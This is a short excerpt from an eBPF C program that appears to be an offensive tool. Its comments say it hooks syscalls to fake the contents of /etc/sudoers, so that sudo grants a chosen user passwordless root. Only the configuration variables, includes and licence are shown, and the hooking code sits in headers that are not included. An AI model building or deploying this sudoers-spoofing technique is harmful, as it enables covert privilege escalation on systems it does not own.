#include "./common.h"
#include "./maps.h"

// Optional Target Parent PID
const volatile int target_ppid = 0;

// The UserID of the user, if we're restricting
// running to just this user
const volatile int uid = 0;

// These store the string we're going to
// add to /etc/sudoers when viewed by sudo
// Which makes it think our user can sudo
// without a password
#define max_payload_len 1024
const volatile int payload_len = 0;
const volatile char payload[100];

#include "./openat_syscall.h"
#include "./read_syscall.h"
#include "./exit_syscall.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";